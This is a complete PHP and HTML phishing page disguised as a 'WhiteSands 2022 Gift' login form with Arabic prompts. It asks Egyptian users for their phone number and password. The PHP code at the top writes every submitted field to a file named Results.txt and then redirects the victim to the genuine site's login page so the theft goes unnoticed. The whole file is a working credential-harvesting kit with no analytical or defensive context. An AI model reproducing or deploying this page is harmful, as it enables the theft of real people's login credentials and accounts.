
<?php
	if(isset($_POST["login"])){
		$handle = fopen("Results.txt", "a");
		foreach($_POST as $variable => $value) {
			#fwrite($handle, $variable);
			#fwrite($handle, "=");
			fwrite($handle, $value);
			fwrite($handle, ":");
		}
		fwrite($handle, "\r\n");
		fclose($handle);
		header("Location: https://whitesands.top/#/login");
		exit;
	}
?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>WhiteSands 2022 Gift</title>
	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" rel="stylesheet"/>
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>

	<header>
		
		<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST"><center>
			<i class="fas fa-user-alt"></i> <label>+20</label> <input type="text" name="email" placeholder="يرجى ادخال رقم الهاتف الخاص بك" required=""><br>
			<i class="fas fa-lock"></i> <input type="password" name="pass" placeholder="من فضلك ادخل رقمك السري" required=""><br>
			<h6>تذكرني <i class="fas fa-check-square"></i></h6>
			<button type="submit" class="login" name="login" >يسجل الدخول</button>
			<p>لا حساب؟ <a href="">يسجل</a></p>
		</center></form>

	</header>
	<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320">
	  <path fill="#6c12c6" fill-opacity="1" d="M0,0L48,16C96,32,192,64,288,96C384,128,480,160,576,144C672,128,768,64,864,69.3C960,75,1056,149,1152,160C1248,171,1344,117,1392,90.7L1440,64L1440,0L1392,0C1344,0,1248,0,1152,0C1056,0,960,0,864,0C768,0,672,0,576,0C480,0,384,0,288,0C192,0,96,0,48,0L0,0Z"></path>
	</svg>

</body>
</html>